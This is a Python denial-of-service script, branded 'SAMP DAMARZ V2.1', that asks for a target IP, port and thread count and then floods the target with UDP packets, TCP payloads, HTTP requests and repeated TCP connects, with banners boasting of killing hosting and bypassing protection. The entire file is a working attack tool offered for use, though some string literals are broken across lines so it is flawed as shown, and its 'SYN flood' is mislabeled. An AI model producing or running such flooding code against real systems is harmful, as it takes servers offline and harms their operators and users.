#AUTHOR SAMP DAMARZ
import random
import socket
import threading
import os
import sys
import time

os.system("clear")
print("\u001B[31m🔥 Welcome to SAMP-DAMARZ World 🔥")
time.sleep(1)
print("\u001B[35mLoading Super Attack...")
os.system("clear")

print("""
\u001B[31m
    ██████╗██╗  ██╗███████╗    ██╗    ██╗███████╗███╗   ███╗███████╗
    ██╔══██╗██║  ██║██╔════╝    ██║    ██║██╔════╝████╗ ████║██╔════╝
    ██████╔╝███████║█████╗      ██║ █╗ ██║█████╗  ██╔████╔██║█████╗  
    ██╔══██╗██╔══██║██╔══╝      ██║███╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  
    ██║  ██║██║  ██║███████╗    ╚███╔███╔╝███████╗██║ ╚═╝ ██║███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝ ╚══════╝╚═╝     ╚═╝╚══════╝ V 2.1
\u001B[35m    AUTHOR: SAMP DAMARZ - TEMBUS HOSTING PROTECTION! 💀🔥
""")

ip = input("\u001B[31mTarget IP: \u001B[37m")
port = int(input("\u001B[31mTarget Port: \u001B[37m"))
choice = input("\u001B[31mUDP Flood? (y/n): \u001B[37m")
times = int(input("\u001B[31mPacket Rate: \u001B[37m"))
threads = int(input("\u001B[31mThreads (max 1000): \u001B[37m"))

def attack_udp():
    while True:
        data = random._urandom(65507)
        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
                s.sendto(data, addr)
            print(i + " UDP FLOOD - BYPASS PROTECTION!")
        except:
            pass

def attack_tcp():
    while True:
        data = random._urandom(1024)
        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data * random.randint(10, 30))
            print(i + " TCP OVERLOAD - HOSTING DOWN!")
        except:
            try:
                s.close()
            except:
                pass

def attack_http():
    while True:
        headers = "GET / HTTP/1.1
Host: " + ip + "
User-Agent: Mozilla/5.0

"
        data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=2000))
        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80 if port == 80 else port))
            s.send(headers.encode())
            s.send(data.encode())
            print(i + " HTTP FLOOD - WEB CRASH!")
        except:
            try:
                s.close()
            except:
                pass

def attack_syn():
    while True:
        data = random._urandom(1024)
        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.send(data)
            print(i + " SYN FLOOD - CONNECTION FLOOD!")
        except:
            try:
                s.close()
            except:
                pass

print("\u001B[31m🚀 ATTACK STARTED - DAMARZ ULTRA MODE! 🚀")
print("\u001B[35mPress Ctrl+C to stop...
")

for y in range(threads):
    t1 = threading.Thread(target=attack_udp)
    t1.daemon = True
    t1.start()
    
    t2 = threading.Thread(target=attack_tcp)
    t2.daemon = True
    t2.start()
    
    if choice.lower() == 'y':
        t3 = threading.Thread(target=attack_http)
        t3.daemon = True
        t3.start()
        t4 = threading.Thread(target=attack_syn)
        t4.daemon = True
        t4.start()

print("\u001B[31m💀 SAMP DAMARZ V2.1 - 100% HOSTING KILLER! 💀\u001B[37m")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("
\u001B[31mAttack Stopped by User!\u001B[37m")
